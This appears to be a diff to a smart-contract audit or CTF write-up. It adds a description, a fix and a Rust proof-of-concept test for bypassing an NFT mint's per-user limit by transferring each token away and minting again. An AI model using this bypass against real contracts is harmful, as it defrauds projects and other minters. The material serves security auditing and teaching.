@@ -1221,7 +1221,7 @@ them after, and then you will be able to claim an increased rewards amount.
 ### Recommendation
 
 Update the user_index in all cases, so that users aren't able to claim rewards from previous staking periods
-(+by extensions a larger share of the current staking)
+(+by extension a larger share of the current staking)
 ```rust
 pub fn update_rewards(user: &mut UserRewardInfo, state: &State) {
     // calculate pending rewards
@@ -1329,14 +1329,151 @@ pub fn update_rewards(user: &mut UserRewardInfo, state: &State) {
 
 ### Description
 
-The bug occurs in ...
+Public blockchains are a superpower because they free us from platform and vendor lock-in.
+Your prized artwork, pfps, game items, etc. can go with you wherever you want and you can
+use as many private keys you want. Including these nice whitelisted, 1/3 nfts we have here.
+The mint doesn't account for this. This is how it checks that mint_per_user hasn't been
+exceeded (under mint() in contract.rs):
+```rust
+    let tokens_response: TokensResponse = deps.querier.query_wasm_smart(
+        config.nft_contract.to_string(),
+        &Cw721QueryMsg::Tokens::<Empty> {
+            owner: info.sender.to_string(),
+            start_after: None,
+            limit: None,
+        },
+    )?;
+
+    // ensure mint per user limit is not exceeded
+    if tokens_response.tokens.len() >= config.mint_per_user as usize {
+        return Err(ContractError::MaxLimitExceeded {});
+    }
+```
+If we simply transfer the nft elsewhere, then tokens.len() will decrease, and we can keep minting!
 
 ### Recommendation
 
-The fix should be ...
+I think that the amount minted to a whitelisted user must be kept in contract storage
+```rust
+pub const MINTED: Map<&Addr, Uint128> = Map::new("minted");
+```
+
+then you can load it inside of mint(), increment after a successful minting, and save
+
+(something like this)
+```rust
+pub fn mint(deps: DepsMut, _env: Env, info: MessageInfo) -> Result<Response, ContractError> {
+    let mut config = CONFIG.load(deps.storage)?;
+
+    // check user is in whitelist
+    let users = WHITELIST.load(deps.storage)?.users;
+    let is_whitelisted = users.iter().any(|user| user == &info.sender.to_string());
+    if !is_whitelisted {
+        return Err(ContractError::NotWhitelisted {});
+    }
+    let mut minted = MINTED.load(deps.storage, &info.sender)?;
+
+    let tokens_response: TokensResponse = deps.querier.query_wasm_smart(
+        config.nft_contract.to_string(),
+        &Cw721QueryMsg::Tokens::<Empty> {
+            owner: info.sender.to_string(),
+            start_after: None,
+            limit: None,
+        },
+    )?;
+
+    // ensure mint per user limit is not exceeded
+    if minted.u128() >= config.mint_per_user as u128 {
+        return Err(ContractError::MaxLimitExceeded {});
+    }
+
+    let token_id = config.total_tokens;
+
+    let msg = CosmosMsg::Wasm(WasmMsg::Execute {
+        contract_addr: config.nft_contract.to_string(),
+        msg: to_binary(&Cw721ExecuteMsg::Mint::<Empty, Empty> {
+            token_id: token_id.to_string(),
+            owner: info.sender.to_string(),
+            token_uri: None,
+            extension: Empty {},
+        })?,
+        funds: vec![],
+    });
+
+    // increment users minted tokens
+    minted += 1;
+
+    // increment total tokens
+    config.total_tokens += 1;
+    CONFIG.save(deps.storage, &config)?;
+    MINTED.save(deps.storage, &info.sender, &minted)?;
+
+    Ok(Response::new()
+        .add_attribute("action", "mint")
+        .add_attribute("recipient", info.sender.to_string())
+        .add_attribute("token_id", token_id.to_string())
+        .add_message(msg))
+}
+```
 
 ### Proof of concept
 
 ```rust
-// code goes here
+    #[test]
+    fn exploit() {
+        let (mut app, contract_addr) = proper_instantiate();
+
+
+        // query whitelisted users
+        let whitelist: Whitelist = app
+            .wrap()
+            .query_wasm_smart(contract_addr.clone(), &QueryMsg::Whitelist {})
+            .unwrap();
+
+        assert!(whitelist.users.contains(&USER1.to_owned()));
+        assert!(whitelist.users.contains(&USER2.to_owned()));
+        assert!(whitelist.users.contains(&USER3.to_owned()));
+
+        let user4 = "user4";
+
+        for _ in 1..51 {
+            // query config
+            let config: Config = app
+                .wrap()
+                .query_wasm_smart(contract_addr.clone(), &QueryMsg::Config {})
+                .unwrap();
+
+            // mint to whitelisted user until max limit
+            assert_eq!(config.mint_per_user, 3);
+
+            let token_id = config.total_tokens;
+            // i will mint as many as i want
+            // the mintoooor
+            app.execute_contract(
+                Addr::unchecked(USER1),
+                contract_addr.clone(),
+                &ExecuteMsg::Mint {},
+                &[],
+            ).unwrap();
+
+            // transfer it so we can keep minting
+            app.execute_contract(
+                Addr::unchecked(USER1),
+                config.nft_contract.clone(),
+                &cw721_base::msg::ExecuteMsg::TransferNft::<Empty, Empty> {
+                    recipient: user4.to_string(),
+                    token_id: token_id.to_string(),
+                },
+                &[],
+            ).unwrap();
+        }
+
+        // ensure total tokens increases
+        let config: Config = app
+            .wrap()
+            .query_wasm_smart(contract_addr, &QueryMsg::Config {})
+            .unwrap();
+
+        assert_eq!(config.total_tokens, 50);
+    }
 ```
